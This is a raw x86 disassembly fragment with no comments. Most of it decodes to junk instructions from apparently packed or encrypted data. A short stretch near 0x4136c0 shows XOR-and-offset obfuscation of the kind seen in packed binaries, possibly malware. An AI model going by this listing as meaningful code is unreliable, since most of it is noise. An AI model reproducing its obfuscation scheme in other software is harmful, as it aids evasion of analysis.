  413489:	push   es
  41348a:	idiv   BYTE PTR [edi]
  41348c:	mov    eax,ds:0x8c145bc5
  413491:	push   esi
  413492:	or     al,0x9c
  413494:	sti    
  413495:	pop    ss
  413496:	adc    BYTE PTR ds:0x31b0d9b9,0xd4
  41349d:	(bad)  
  41349f:	sub    dh,bl
  4134a1:	mov    ds:0x539e3462,eax
  4134a6:	jae    0x413474
  4134a8:	mov    edi,0xd1331756
  4134ad:	adc    DWORD PTR es:[esi-0x4b3872f5],ecx
  4134b4:	xchg   ebp,eax
  4134b5:	or     eax,0x3582c5df
  4134ba:	(bad)  [ebx-0x160efbbd]
  4134c0:	mov    eax,0xe8d6f455
  4134c5:	sahf   
  4134c6:	mov    WORD PTR [ebp-0x3a21ec74],ds
  4134cc:	and    BYTE PTR [ecx+edx*8+0x616dfac6],ah
  4134d3:	push   0xffffff97
  4134d5:	fdiv   QWORD PTR [edx+0x213f4e7a]
  4134db:	push   edi
  4134dc:	retf   
  4134dd:	nop
  4134de:	mov    cx,0xba5b
  4134e2:	sahf   
  4134e3:	out    0x57,al
  4134e5:	retf   0x877
  4134e8:	mov    esi,0x8f2dbe30
  4134ed:	(bad)  
  4134ee:	dec    BYTE PTR [ecx-0x26]
  4134f1:	push   esi
  4134f2:	int    0x46
  4134f4:	sub    esi,DWORD PTR [ecx+0x39b91746]
  4134fa:	inc    ebx
  4134fb:	mov    eax,ds:0x64e76611
  413500:	mov    cl,BYTE PTR [ecx+0x62]
  413503:	lea    edi,[ecx-0x29]
  413506:	rcl    BYTE PTR [ecx+ebp*2+0x7f5f4c17],0x89
  41350e:	fs gs xchg edx,eax
  413511:	out    dx,eax
  413512:	mov    esp,0x691b3520
  413517:	sti    
  413518:	or     ecx,esi
  41351a:	add    ecx,edi
  41351c:	sub    BYTE PTR [edx],ch
  41351e:	stc    
  41351f:	fwait
  413520:	mov    ebp,0xc1e0249a
  413525:	bound  ebx,QWORD PTR [di-0x8]
  413529:	test   BYTE PTR [eax+edx*1+0x52],dh
  41352d:	jae    0x413519
  41352f:	push   ecx
  413530:	popf   
  413531:	in     eax,0xd
  413533:	aam    0x71
  413535:	inc    eax
  413536:	xor    DWORD PTR [ebx+0x49],ecx
  413539:	push   ebx
  41353a:	daa    
  41353b:	pop    ds
  41353c:	jmp    0xc1d5f11d
  413541:	neg    edx
  413543:	fild   DWORD PTR [edi]
  413545:	dec    DWORD PTR [esi+0xf]
  413548:	jle    0x413546
  41354a:	inc    ebx
  41354b:	loopne 0x41357f
  41354d:	add    ah,BYTE PTR [ecx+0x71e284f4]
  413553:	sub    cl,dh
  413555:	sahf   
  413556:	loopne 0x413596
  413558:	push   es
  413559:	pop    edx
  41355a:	fmul   QWORD PTR [edx+0x173b6789]
  413560:	mov    esi,0x2f946a73
  413565:	xor    BYTE PTR [esi],cl
  413567:	adc    dl,BYTE PTR [ebp+0x676f9dd2]
  41356d:	(bad)
  413572:	clc    
  413573:	add    DWORD PTR [esi+0xcce4989],edx
  413579:	ss stc 
  41357b:	cmc    
  41357c:	xchg   ecx,eax
  41357d:	xchg   ecx,eax
  41357e:	push   ebp
  41357f:	pop    edi
  413580:	add    DWORD PTR [edx-0x608d2e5a],0xffffffb1
  413587:	add    DWORD PTR [edi],esi
  413589:	cld    
  41358a:	or     ebp,edi
  41358c:	xor    al,0xbd
  41358e:	and    eax,0x9e8c833d
  413593:	dec    DWORD PTR [esi+0x26]
  413596:	jbe    0x41351a
  413598:	jecxz  0x41352e
  41359a:	les    edi,FWORD PTR [eax-0x6ea19bae]
  4135a0:	push   ds
  4135a1:	ins    DWORD PTR es:[edi],dx
  4135a2:	xchg   ebx,eax
  4135a3:	jmp    0x4135f8
  4135a5:	dec    edi
  4135a6:	dec    esp
  4135a7:	xor    ebp,DWORD PTR [edi+0x4582bc36]
  4135ad:	daa    
  4135ae:	xchg   ecx,eax
  4135af:	pushf  
  4135b0:	lds    ecx,FWORD PTR [eax+0x1f]
  4135b3:	pop    esi
  4135b4:	dec    edi
  4135b5:	and    BYTE PTR [ecx-0x1b],cl
  4135b8:	adc    DWORD PTR [esp+eax*2-0x52],esp
  4135bc:	in     eax,0x89
  4135be:	dec    edi
  4135bf:	out    dx,eax
  4135c0:	call   0x60d9b698
  4135c5:	stos   BYTE PTR es:[edi],al
  4135c6:	sub    ebx,esp
  4135c8:	adc    eax,0xc82aaf2c
  4135cd:	in     al,dx
  4135ce:	xchg   ebx,eax
  4135cf:	xor    ecx,DWORD PTR [ecx+eax*4-0x6]
  4135d3:	jp     0x413558
  4135d5:	push   es
  4135d6:	fdiv   DWORD PTR [ecx+0x45]
  4135d9:	rcr    dl,1
  4135db:	(bad)  
  4135dc:	aaa    
  4135dd:	in     eax,dx
  4135de:	sbb    BYTE PTR [edx],bl
  4135e0:	ss ins DWORD PTR es:[edi],dx
  4135e2:	clc    
  4135e3:	jl     0x4135c4
  4135e5:	push   edx
  4135e6:	pop    edx
  4135e7:	xor    BYTE PTR [ebx-0x27],dh
  4135ea:	sub    dh,BYTE PTR [ecx+0x66]
  4135ed:	inc    edi
  4135ee:	(bad)  
  4135ef:	mov    dh,0x41
  4135f1:	fsubp  st(2),st
  4135f3:	popf   
  4135f4:	imul   ecx,DWORD PTR [ecx-0x1b],0xe80c61
  4135fb:	int3   
  4135fc:	rcl    DWORD PTR [edx-0x16],1
  4135ff:	mov    ds:0xf1922159,eax
  413604:	je     0x4135c8
  413606:	(bad)  
  413607:	clc    
  413608:	fwait
  413609:	gs clc 
  41360b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41360c:	sub    al,0x1e
  41360e:	xor    DWORD PTR [eax],ebx
  413610:	mov    edx,0xd8750e09
  413615:	xchg   edi,eax
  413616:	push   ecx
  413617:	xchg   esp,eax
  413618:	add    al,0x91
  41361a:	mov    al,ds:0x70cef151
  41361f:	mov    bh,0x63
  413621:	and    edi,esp
  413623:	xlat   BYTE PTR ds:[ebx]
  413624:	cmc    
  413625:	imul   eax,edx,0xdfd0e639
  41362b:	int    0x44
  41362d:	aas    
  41362e:	adc    si,WORD PTR [edi]
  413631:	(bad)  
  413632:	stc    
  413633:	outs   dx,BYTE PTR ds:[esi]
  413634:	es sub eax,edx
  413637:	addr16 push ecx
  413639:	mov    dl,0xf8
  41363b:	jecxz  0x413685
  41363d:	stos   BYTE PTR es:[edi],al
  41363e:	or     cl,dl
  413640:	and    esi,0x77
  413643:	push   0x12f74ec4
  413648:	arpl   WORD PTR [ebx],bp
  41364a:	adc    eax,0x1f047c85
  41364f:	or     BYTE PTR [ebx-0x4958357a],0x8b
  413656:	sub    al,0x5c
  413658:	ror    BYTE PTR [ecx+0x241855e6],1
  41365e:	es pop edx
  413660:	sub    eax,0xc0d115d6
  413665:	(bad)  
  413666:	addr16 sar ebx,cl
  413669:	out    dx,eax
  41366a:	sti    
  41366b:	sbb    DWORD PTR [esi+0x73],ebp
  41366e:	add    al,0xce
  413670:	inc    ebx
  413671:	xchg   edi,eax
  413672:	jecxz  0x413670
  413674:	retf   
  413675:	jmp    0xe6cf:0xfd53e4e8
  41367c:	sub    al,0x59
  41367e:	lods   al,BYTE PTR ds:[esi]
  41367f:	js     0x41367b
  413681:	jmp    0x9ff2:0x24c109ab
  413688:	sub    ch,BYTE PTR [ecx+0x40]
  41368b:	xor    DWORD PTR [ebx+ebp*2+0x1a],edx
  41368f:	icebp  
  413690:	dec    eax
  413691:	push   0x45
  413693:	fisttp DWORD PTR [edx-0x105fe78b]
  413699:	hlt    
  41369a:	dec    ebx
  41369b:	mov    ah,0xa2
  41369d:	xchg   esp,eax
  41369e:	jno    0x413659
  4136a0:	out    0x4c,al
  4136a2:	sub    bl,ah
  4136a4:	push   edx
  4136a5:	sub    DWORD PTR [ebx-0x4b91f6f5],edi
  4136ab:	sbb    DWORD PTR [edi-0x5075a3c1],esp
  4136b1:	jmp    0x4136e0
  4136b3:	inc    edi
  4136b4:	xchg   BYTE PTR ds:0xa6f2fcc3,dh
  4136ba:	and    DWORD PTR [ecx+0x1819d215],edx
  4136c0:	mov    ebx,DWORD PTR [ebp-0xc]
  4136c3:	xor    edx,esi
  4136c5:	add    edx,edi
  4136c7:	imul   edx,ebx
  4136ca:	mov    ebx,DWORD PTR [ebp-0x8]
  4136cd:	mov    BYTE PTR [edx+ebx*1],al
  4136d0:	mov    eax,DWORD PTR [ebp-0x30]
  4136d3:	mov    edx,DWORD PTR [ebp-0x3c]
  4136d6:	xor    eax,esi
  4136d8:	xor    edx,esi
  4136da:	add    eax,edi
  4136dc:	add    edx,edi
  4136de:	imul   eax,edx
  4136e1:	add    eax,DWORD PTR [ebp-0xc]
  4136e4:	mov    DWORD PTR [ebp-0xc],eax
  4136e7:	mov    eax,DWORD PTR [ebp-0xc]
  4136ea:	mov    edx,DWORD PTR [ebp-0x24]
  4136ed:	cmp    edx,eax
  4136ef:	jb     0x411257
  4136f5:	mov    eax,DWORD PTR [ebp-0x3c]
  4136f8:	mov    edx,DWORD PTR [ebp-0x24]
  4136fb:	xor    eax,esi
  4136fd:	add    eax,edi
  4136ff:	imul   eax,edx
  413702:	mov    edx,DWORD PTR [ebp-0x20]
  413705:	xor    edx,esi
  413707:	add    edx,edi
  413709:	or     eax,edx
  41370b:	mov    edx,DWORD PTR [ebp-0x18]
  41370e:	xor    edx,esi
  413710:	add    eax,edx
  413712:	mov    edx,DWORD PTR [ebp-0x18]
  413715:	xor    edx,esi
  413717:	add    eax,edx
  413719:	mov    edx,DWORD PTR [ebp-0x10]
  41371c:	lea    eax,[eax+edx*1+0x64e5b6]
  413723:	jmp    0x413737
  413728:	mov    eax,DWORD PTR [ebp-0x18]
  41372b:	mov    edx,DWORD PTR [ebp-0x10]
  41372e:	xor    eax,esi
  413730:	lea    eax,[eax+edx*1+0x3272db]
  413737:	mov    DWORD PTR [ebp-0x10],eax
  41373a:	jmp    0x4111a4
  41373f:	mov    eax,DWORD PTR [ebp-0x38]
  413742:	mov    edx,DWORD PTR [ebp+0xc]
  413745:	xor    edx,esi
  413747:	lea    ecx,[ecx+edx*1+0x3272db]
  41374e:	lea    edx,[ecx-0x3272db]
  413754:	xor    edx,esi
  413756:	cmp    edx,0xf89c95b6
  41375c:	jne    0x410fde
  413762:	mov    ecx,DWORD PTR [ebp+0x8]
  413765:	mov    edx,DWORD PTR [ebp+0xc]
  413768:	mov    ebx,DWORD PTR [ebp+0x8]
  41376b:	xor    edx,esi
  41376d:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  413774:	xor    ecx,esi
  413776:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  41377d:	xor    ebx,esi
  41377f:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  413786:	jmp    0x415b38
  41378b:	xlat   BYTE PTR ds:[ebx]
  41378c:	repz mov bh,0xb2
  41378f:	xchg   ebx,eax
  413790:	mov    fs,WORD PTR [edi+0xef9e63]
  413796:	mov    bl,0x12
  413798:	mov    al,0x45
  41379a:	cmp    esp,DWORD PTR [edx-0x329d9d95]
  4137a0:	pop    edi
  4137a1:	bound  esp,QWORD PTR [edx-0x6a]
  4137a4:	lahf   
  4137a5:	adc    BYTE PTR [eax],bl
  4137a7:	mov    eax,DWORD PTR [edi]
  4137a9:	mov    esp,DWORD PTR ds:0xda0ed16f
  4137af:	call   0xce3f:0x2d23ae5c
  4137b6:	xchg   ecx,esi
  4137b8:	push   es
  4137b9:	inc    ecx
  4137ba:	mov    dl,0x72
  4137bc:	mov    dl,0x18
  4137be:	popf   
  4137bf:	fisub  WORD PTR [ebx+0x16963bea]
  4137c5:	sahf   
  4137c6:	xchg   cl,cl
  4137c8:	xlat   BYTE PTR ds:[ebx]
  4137c9:	(bad)  
  4137ca:	loop   0x41382a
  4137cc:	ss (bad) 
  4137ce:	mul    BYTE PTR [edx-0x25]
  4137d1:	fdiv   QWORD PTR [ebp-0x5bb6c121]
  4137d7:	ror    DWORD PTR [edx],1
  4137d9:	add    BYTE PTR [ebx-0x5e],bl
  4137dc:	out    dx,al
  4137dd:	scas   al,BYTE PTR es:[edi]
  4137de:	sbb    al,BYTE PTR [edi]
  4137e0:	stos   DWORD PTR es:[edi],eax
  4137e1:	lea    esp,[edi+0x45]
  4137e4:	(bad)  
  4137e5:	mov    dl,0xc3
  4137e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137e8:	jae    0x41378e
  4137ea:	sbb    al,0xe3
  4137ec:	mov    DWORD PTR [esi-0x8ef2190],0x51071ad1
  4137f6:	xchg   ebp,eax
  4137f7:	outs   dx,BYTE PTR ds:[esi]
  4137f8:	jmp    0x41381d
  4137fa:	loope  0x4137ea
  4137fc:	pushf  
  4137fd:	inc    esi
  4137fe:	imul   ecx,DWORD PTR [edi-0x57634bf9],0xb
  413805:	push   esp
  413806:	les    ebp,FWORD PTR [esi+ebx*4]
  413809:	inc    edi
  41380a:	sub    al,al
  41380c:	mov    ch,BYTE PTR [edi]
  41380e:	bnd jno 0x413873
  413811:	mov    edx,ebp
  413813:	(bad)  
  413814:	inc    edi
  413815:	jle    0x413886
  413817:	cmp    eax,0xef81ac9d
  41381c:	sbb    eax,DWORD PTR [edi+ebx*2]
  41381f:	mov    DWORD PTR [ebx+0x18],eax
  413822:	sti    
  413823:	iret   
  413824:	outs   dx,DWORD PTR ds:[esi]
  413825:	in     eax,0x74
  413827:	stos   BYTE PTR es:[edi],al
  413828:	(bad)  
  413829:	sub    bl,cl
  41382b:	out    dx,al
  41382c:	dec    ebp
  41382d:	mov    dh,0x2
  41382f:	mov    ah,0x4c
  413831:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413833:	pushf  
  413834:	(bad)  
  413835:	cmp    al,0x4e
  413837:	repnz das 
  413839:	adc    eax,0xbec1801c
  41383e:	shr    DWORD PTR [ebx-0x8167629],1
  413844:	stos   DWORD PTR es:[edi],eax
  413845:	jns    0x413845
  413847:	dec    ebx
  413848:	lods   al,BYTE PTR ds:[esi]
  413849:	sub    DWORD PTR [ecx+0x581ce4f3],0x1
  413850:	sub    eax,0xd9f8eb57
  413855:	out    0xb1,eax
  413857:	inc    eax
  413858:	and    DWORD PTR [bx+si-0x5b0a],edi
  41385d:	js     0x413860
  41385f:	push   ds
  413860:	(bad)  
  413861:	aad    0xe2
  413863:	retf   0x2dbc
  413866:	add    dl,BYTE PTR [edx+0x3d41ae62]
  41386c:	aas    
  41386d:	mov    BYTE PTR [esi-0x60],bh
  413870:	fidiv  WORD PTR [edi-0x3ba1d1f9]
  413876:	out    dx,eax
  413877:	xor    eax,0xf196b148
  41387c:	std    
  41387d:	push   esi
  41387e:	xchg   esp,eax
  41387f:	jmp    0x41387b
  413881:	arpl   WORD PTR [edi-0x80],dx
  413884:	mov    BYTE PTR [ebx-0x17],ch
  413887:	fstp   DWORD PTR [eax-0x5f2c50dc]
  41388d:	sbb    BYTE PTR [ecx],bh
  41388f:	gs pop ss
  413891:	enter  0x8cbf,0x27
  413895:	and    bl,BYTE PTR [ebp+0x61]
  413898:	cdq    
  413899:	xor    ecx,DWORD PTR [ebx]
  41389b:	jmp    0x7abd:0xcc64fe1e
  4138a2:	loope  0x413861
  4138a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138a5:	scas   eax,DWORD PTR es:[edi]
  4138a6:	gs in  al,dx
  4138a8:	das    
  4138a9:	test   BYTE PTR [ebx+0x3ae6b563],ch
  4138af:	out    0xd2,eax
  4138b1:	(bad)  
  4138b2:	push   ds
  4138b3:	push   edi
  4138b4:	leave  
  4138b5:	call   0xdea5:0x78937541
  4138bc:	inc    ebp
  4138bd:	shr    DWORD PTR [eax],cl
  4138bf:	cwde   
  4138c0:	mov    ds:0xab75356a,al
  4138c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138c6:	mov    cl,0xd5
  4138c8:	cmp    DWORD PTR [esi+0x9],ecx
  4138cb:	adc    bl,ah
  4138cd:	pop    ebx
  4138ce:	jle    0x4138a5
  4138d0:	jmp    0xa51e:0xe5b1296d
  4138d7:	gs hlt 
  4138d9:	and    DWORD PTR [edx+0x1db52378],ebp
  4138df:	or     ah,bl
  4138e1:	leave  
  4138e2:	pop    esi
  4138e3:	rol    dh,cl
  4138e5:	sbb    BYTE PTR [ebp-0x7fae8500],ch
  4138eb:	sbb    ebx,DWORD PTR [esi]
  4138ed:	add    al,0xb2
  4138ef:	int    0x2d
  4138f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138f2:	jecxz  0x413963
  4138f4:	sub    ebx,DWORD PTR [esi+0x55791f00]
  4138fa:	fcmovb st,st(1)
  4138fc:	aad    0xb0
  4138fe:	mov    BYTE PTR [ecx+0x45318cb2],ch
  413904:	mov    dh,bl
  413906:	push   ecx
  413907:	in     al,0x36
  413909:	pop    ds
  41390a:	add    al,0x6d
  41390c:	imul   esi,eax,0x5b
  41390f:	add    edx,edi
  413911:	push   ss
  413912:	and    DWORD PTR [eax+0x6a70a399],0x5e44cba8
  41391c:	sub    al,0xf9
  41391e:	sub    al,0xe1
  413920:	sbb    al,0x4e
  413922:	dec    eax
  413923:	push   ds
  413924:	gs jne 0x413992
  413927:	lea    edx,[eax]
  413929:	or     esp,DWORD PTR [ecx+0x7]
  41392c:	call   0xf7e9cbe4
  413931:	push   0x72b0951d
  413936:	jp     0x413918
  413938:	dec    esi
  413939:	test   al,0x22
  41393b:	xor    al,0x79
  41393d:	sub    DWORD PTR [edi],edx
  41393f:	int    0x88
  413941:	shl    esp,0x4
  413944:	or     DWORD PTR [eax+eax*8-0x4b],eax
  413948:	fbld   TBYTE PTR [ecx-0x176fd5a8]
  41394e:	jb     0x41398d
  413950:	(bad)  
  413951:	int    0x9c
  413953:	popa   
  413954:	ins    BYTE PTR es:[edi],dx
  413955:	frstor [ebx+0x49ccbcb6]
  41395b:	cdq    
  41395c:	pop    esp
  41395d:	pop    ds
  41395e:	popa   
  41395f:	mov    bl,0xb0
  413961:	push   esp
  413962:	enter  0x1871,0xdc
  413966:	dec    ebp
  413967:	mov    edx,fs
  413969:	cs or  al,0x7f
  41396d:	push   eax
  41396e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41396f:	mov    eax,0x3bcd1265
  413974:	jo     0x4139af
  413976:	pusha  
  413977:	repz (bad) 
  413979:	lds    edi,FWORD PTR gs:[esi-0x5b]
  41397d:	scas   al,BYTE PTR es:[edi]
  41397e:	adc    al,0xdb
  413980:	jmp    0x41398b
  413982:	dec    ebp
  413983:	mov    ebx,0x6c3e0b72
  413988:	dec    ecx
  413989:	or     ebx,DWORD PTR [ecx]
  41398b:	mov    ds:0x226afbaa,al
  413990:	jae    0x4139f8
  413992:	push   es
  413993:	(bad)  
  413994:	dec    DWORD PTR [esi+0x3f]
  413997:	inc    ebx
  413998:	sahf   
  413999:	xor    dl,cl
  41399b:	fwait
  41399c:	xchg   edx,eax
  41399d:	fwait
  41399e:	loope  0x4139db
  4139a0:	cs das 
  4139a2:	dec    eax
  4139a3:	fdiv   QWORD PTR [edx+0x38]
  4139a6:	(bad)  
  4139a7:	mov    esi,0xfa0d3c99
  4139ac:	pop    edx
  4139ad:	outs   dx,DWORD PTR ds:[esi]
  4139ae:	add    al,cl
  4139b0:	sbb    esi,ebx
  4139b2:	cmc    
  4139b3:	pop    edx
  4139b4:	mov    cl,0xd8
  4139b6:	cmp    dl,BYTE PTR [ecx+0x7e9be955]
  4139bc:	sub    al,0xf
  4139be:	pop    esi
  4139bf:	mov    dh,0x99
  4139c1:	xchg   ecx,eax
  4139c2:	popf   
  4139c3:	inc    esp
  4139c4:	xchg   ebp,eax
  4139c5:	pushf  
  4139c6:	mov    edi,ecx
  4139c8:	xchg   edi,eax
  4139c9:	xor    ah,al
  4139cb:	mov    eax,0xdfa7b067
  4139d0:	test   edi,ebp
  4139d2:	cwde   
  4139d3:	mov    DWORD PTR [esi],edx
  4139d5:	lods   al,BYTE PTR ds:[esi]
  4139d6:	daa    
  4139d7:	aam    0xe3
  4139d9:	fsubr  DWORD PTR [ecx-0x6220703d]
  4139df:	xor    al,0xf6
  4139e1:	dec    ebp
  4139e2:	std    
  4139e3:	xchg   edi,eax
  4139e4:	adc    esp,ecx
  4139e6:	mov    esi,0x924b3092
  4139eb:	aaa    
  4139ec:	pop    ecx
  4139ed:	cmp    al,0xd9
  4139ef:	mov    ebx,0x96d583e7
  4139f4:	lods   al,BYTE PTR ds:[esi]
  4139f5:	pop    ds
  4139f6:	call   0x41787c27
  4139fb:	jne    0x413a23
  4139fd:	fcom   QWORD PTR [esi]
  4139ff:	or     DWORD PTR [esi-0x6a33b64c],ebx
  413a05:	nop
  413a06:	or     DWORD PTR [eax],ebp
  413a08:	cmp    DWORD PTR [eax+0x36],edi
  413a0b:	mov    dh,0xdc
  413a0d:	mov    edx,0x7c4fa89e
  413a12:	js     0x4139c0
  413a14:	adc    DWORD PTR [esi-0x4548146a],edi
  413a1a:	in     eax,dx
  413a1b:	inc    ebp
  413a1c:	push   ebp
  413a1d:	cmc    
  413a1e:	jno    0x4139d5
  413a20:	jo     0x4139d5
  413a22:	or     DWORD PTR [eax+edi*1-0x5f735ac6],0x76c486c2
  413a2d:	jnp    0x413a0e
  413a2f:	and    ecx,edi
  413a31:	lahf   
  413a32:	adc    dl,BYTE PTR [eax]
  413a34:	or     ecx,DWORD PTR [ecx-0x1c]
  413a37:	aad    0xff
  413a39:	mov    bl,0xfe
  413a3b:	adc    DWORD PTR [ebx-0x38],ebp
  413a3e:	and    esi,edx
  413a40:	xchg   edi,eax
  413a41:	inc    ebp
  413a42:	inc    esp
  413a43:	jl     0x4139d5
  413a45:	inc    eax
  413a46:	dec    edi
  413a47:	lods   al,BYTE PTR ds:[esi]
  413a48:	sub    bh,BYTE PTR [ebx+0x17ea8d61]
  413a4e:	inc    esi
  413a4f:	mov    ebx,0xcaed3938
  413a54:	push   ds
  413a55:	push   ebp
  413a56:	pop    ds
  413a57:	jae    0x4139f1
  413a59:	loopne 0x413a7d
  413a5b:	test   al,0xa
  413a5d:	mov    ecx,0xa3d9940b
  413a62:	jnp    0x413a11
  413a64:	(bad)  
  413a66:	push   ebx
  413a67:	or     ch,BYTE PTR ds:0xa5210d9d
  413a6d:	jo     0x413a05
  413a6f:	loopne 0x413a02
  413a71:	xor    ch,BYTE PTR [edx]
  413a73:	cmc    
  413a74:	lahf   
  413a75:	push   cs
  413a76:	and    esp,DWORD PTR [esi]
  413a78:	dec    ecx
  413a79:	adc    DWORD PTR [esi+0x10],esp
  413a7c:	and    al,0x3
  413a7e:	sub    ebx,DWORD PTR [ebp-0x794ded6d]
  413a84:	(bad)  
  413a85:	add    BYTE PTR [esi],bh
  413a87:	scas   al,BYTE PTR es:[edi]
  413a88:	mov    ds:0x8eb3b70e,al
  413a8d:	retf   
  413a8e:	(bad)  
  413a8f:	das    
  413a90:	mov    dl,0xc4
  413a92:	add    edi,DWORD PTR [ecx+0x18]
  413a95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a96:	inc    DWORD PTR [eax-0x72]
  413a99:	shl    DWORD PTR ds:0xeebc2232,0x31
  413aa0:	mov    ecx,0xcdd72436
  413aa5:	rol    dl,cl
  413aa7:	jge    0x413ad5
  413aa9:	in     eax,0xde
  413aab:	add    esp,ebp
  413aad:	xchg   edx,eax
  413aae:	xor    edx,ebx
  413ab0:	lds    ebp,FWORD PTR [edx+0x48]
  413ab3:	pop    ecx
  413ab4:	jb     0x413af1
  413ab6:	xchg   esi,eax
  413ab7:	cmc    
  413ab8:	sub    ebx,ecx
  413aba:	mov    esi,0xc171bd93
  413abf:	or     DWORD PTR [ecx+ebx*4-0x38],esi
  413ac3:	sub    esi,DWORD PTR [eax+0x4fe7ce61]
  413ac9:	jp     0x413aca
  413acb:	in     eax,dx
  413acc:	cdq    
  413acd:	and    BYTE PTR [ebx+ebp*1],bh
  413ad0:	stos   DWORD PTR es:[edi],eax
  413ad1:	out    0xf6,al
  413ad3:	stc    
  413ad4:	ja     0x413ae1
  413ad6:	iret   
  413ad7:	popa   
  413ad8:	mov    al,0x5b
  413ada:	and    edx,DWORD PTR [ecx+0x7f]
  413add:	xor    cl,ch
  413adf:	fs (bad) 
  413ae2:	into   
  413ae3:	jg     0x413acf
  413ae5:	adc    BYTE PTR gs:[ebx+ebx*8-0xb25ddf7],bl
  413aed:	jle    0x413b22
  413aef:	lock sub cl,BYTE PTR [ebx]
  413af2:	out    0x44,eax
  413af4:	test   al,0x3e
  413af6:	lahf   
  413af7:	sti    
  413af8:	adc    BYTE PTR [edx],bh
  413afa:	ret    
  413afb:	mov    edi,0x18e8f8b4
  413b00:	dec    eax
  413b01:	adc    al,0xbb
  413b03:	cmp    al,0x43
  413b05:	mov    al,ds:0xcf32413a
  413b0a:	pop    es
  413b0b:	inc    esi
  413b0c:	push   esi
  413b0d:	dec    eax
  413b0e:	cmp    BYTE PTR [ecx+0x1],0xcf
  413b12:	lea    esi,[ecx-0x5e]
  413b15:	iret   
  413b16:	mov    edi,DWORD PTR [esp+0x5d582981]
  413b1d:	inc    ebx
  413b1e:	aaa    
  413b1f:	stos   BYTE PTR es:[edi],al
  413b20:	daa    
  413b21:	or     bh,BYTE PTR [eax-0x49]
  413b24:	mov    fs,WORD PTR [esi-0x42b38b95]
  413b2a:	push   cs
  413b2b:	xor    DWORD PTR [eax-0x48],eax
  413b2e:	ja     0x413b97
  413b30:	adc    DWORD PTR [ebx+edx*8-0x206fdc3a],0xffffffec
  413b38:	adc    DWORD PTR [ebx],0xffffffea
  413b3b:	jo     0x413ae9
  413b3d:	xor    al,0x1d
  413b3f:	int    0x24
  413b41:	cmc    
  413b42:	dec    edx
  413b43:	push   esp
  413b44:	(bad)  
  413b45:	xchg   ebx,eax
  413b46:	add    ecx,ebp
  413b48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b49:	lds    esp,FWORD PTR [ebx+0x3dc5d28a]
  413b4f:	pusha  
  413b50:	mov    bh,0x55
  413b52:	or     DWORD PTR [edx+0x72],0x22
  413b56:	imul   ecx,ebx,0xc
  413b59:	out    dx,eax
  413b5a:	(bad)  
  413b5b:	dec    eax
  413b5c:	fadd   QWORD PTR [ecx+0x711546c5]
  413b62:	inc    esp
  413b63:	shl    DWORD PTR [edx+eax*4+0x75],cl
  413b67:	push   edi
  413b68:	test   esp,eax
  413b6a:	in     eax,0x28
  413b6c:	sub    BYTE PTR [esi-0x17],bh
  413b6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b70:	or     eax,0x2a32ad58
  413b75:	xchg   DWORD PTR [esi-0x5],ebp
  413b78:	cmp    ah,BYTE PTR [edi]
  413b7a:	js     0x413ba7
  413b7c:	jae    0x413bda
  413b7e:	mov    ah,0x7
  413b80:	in     eax,dx
  413b81:	push   ds
  413b82:	rcr    cl,cl
  413b84:	dec    ebp
  413b85:	mov    ecx,0xfa78fff9
  413b8a:	mov    WORD PTR [ecx-0x36],ss
  413b8d:	lods   al,BYTE PTR ds:[esi]
  413b8e:	push   0xf0472f23
  413b93:	not    BYTE PTR [ebx+0x6ec68c96]
  413b99:	inc    edi
  413b9a:	test   al,0x28
  413b9c:	xor    al,0xd4
  413b9e:	mov    edi,0x8860d371
  413ba3:	ficomp DWORD PTR ds:0xff152bf5
  413ba9:	push   ebx
  413baa:	pop    esi
  413bab:	aaa    
  413bac:	gs xchg ecx,eax
  413bae:	out    0x59,eax
  413bb0:	xchg   ebp,eax
  413bb1:	pushf  
  413bb2:	(bad)  
  413bb4:	mov    BYTE PTR [edi+0x7d],bl
  413bb7:	mov    BYTE PTR [ebp-0x3466084c],dh
  413bbd:	mov    ah,0x79
  413bbf:	mov    esp,0x193333fa
  413bc4:	loopne 0x413c43
  413bc6:	(bad)  
  413bc7:	jle    0x413b89
  413bc9:	and    eax,0x45e8b8e7
  413bce:	ins    DWORD PTR es:[edi],dx
  413bcf:	add    BYTE PTR ds:0xe9ffb430,dl
  413bd5:	test   al,0x9d
  413bd8:	mov    bh,0xe7
  413bda:	fadd   st(7),st
  413bdc:	or     ah,bl
  413bde:	jne    0x413b8d
  413be0:	sub    al,0x8c
  413be2:	mov    eax,0x3f9ff1b6
  413be7:	pushf  
  413be8:	and    dh,dh
  413bea:	cmc    
  413beb:	or     edi,ebp
  413bed:	mov    dl,0xae
  413bef:	jp     0x413b74
  413bf1:	(bad)  
  413bf2:	ficom  DWORD PTR [edi+esi*4-0x7a1f926a]
  413bf9:	pop    ss
  413bfa:	sbb    al,0xdf
  413bfc:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413bfe:	push   ss
  413bff:	xor    BYTE PTR [edx+0x743f6cd8],dl
  413c05:	jne    0x413c4b
  413c07:	fcomi  st,st(7)
  413c09:	rcl    DWORD PTR [edi-0x9],cl
  413c0c:	push   0xdc4b4f02
  413c11:	repnz push ebp
  413c13:	push   edi
  413c14:	pop    eax
  413c15:	mov    ds:0x863955ab,eax
  413c1a:	inc    esi
  413c1b:	adc    eax,0x552c7ae6
  413c20:	add    ecx,edi
  413c22:	sbb    esp,eax
  413c24:	or     DWORD PTR [edx+0x485752ef],0xffffffc2
  413c2b:	popf   
  413c2c:	add    BYTE PTR [ecx],al
  413c2e:	push   ebp
  413c2f:	push   0x819bbaf6
  413c34:	push   ecx
  413c35:	pop    ecx
  413c36:	add    BYTE PTR [edi-0x25c10dd4],ch
  413c3c:	sbb    esp,edx
  413c3e:	or     DWORD PTR [edi],ebx
  413c40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c41:	out    0x5d,eax
  413c43:	xchg   esp,eax
  413c44:	pop    esi
